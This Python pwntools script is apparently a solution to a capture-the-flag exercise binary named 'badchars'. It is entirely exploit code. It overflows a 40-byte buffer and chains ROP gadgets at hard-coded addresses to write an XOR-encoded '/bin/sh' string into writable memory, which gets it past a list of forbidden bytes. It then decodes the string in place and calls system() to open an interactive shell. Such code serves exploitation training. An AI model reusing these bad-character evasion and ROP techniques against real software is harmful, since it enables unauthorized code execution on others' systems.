import sys; sys.path.append("../..")
import shared_pwn
from pwn import *

badchars = ["b","i","c","f","n","s","/"," "]

def find_valid_string_with_XOR(originalString):

    FOUND_SOLUTION = False

    xor_value = 0

    while not FOUND_SOLUTION:
        xor_value += 1
        newString = ""
        for o in originalString:
            newChar = chr(ord(o) ^ xor_value)
            
            if newChar in badchars:
                break

            newString += newChar

        else:
            FOUND_SOLUTION = True
        

    return newString, xor_value

BINARY_NAME = "badchars"
BUFFER_LEN = 40

command = "/bin/sh\0"

junk = b"A" * BUFFER_LEN

# Gadgets
mov_gad     = p64(0x0400b34) # mov qword ptr [r13], r12 ; ret
pop_pop_gad = p64(0x0400b3b) # pop r12 ; pop r13 ; ret

xor_gad     = p64(0x0400b30) # xor byte ptr [r15], r14b ; ret
pop_pop_xor = p64(0x0400b40) # pop r14 ; pop r15 ; ret

pop_rdi     = p64(0x0400b39) # pop rdi ; ret

# Addresses
system_adr  = p64(0x04006f0)
data_addr   = 0x601070 + 64
main_addr   = p64(0x0400886)

xor_string, xor_value = find_valid_string_with_XOR(command)

payload  = b""
payload += junk

# Writes XOR string to memory
payload += pop_pop_gad
payload += str.encode(xor_string)
payload += p64(data_addr)
payload += mov_gad

# XORs string with value
xor_addr = data_addr
for o in command:
    payload += pop_pop_xor
    payload += p64(xor_value)
    payload += p64(xor_addr)
    payload += xor_gad

    xor_addr += 1

payload += pop_rdi
payload += p64(data_addr)
payload += system_adr

io = process(f"./{BINARY_NAME}")
io.recvuntil("\n> ")
io.send(payload)
io.send("\n")
io.interactive()

# sys.stdout.buffer.write(payload)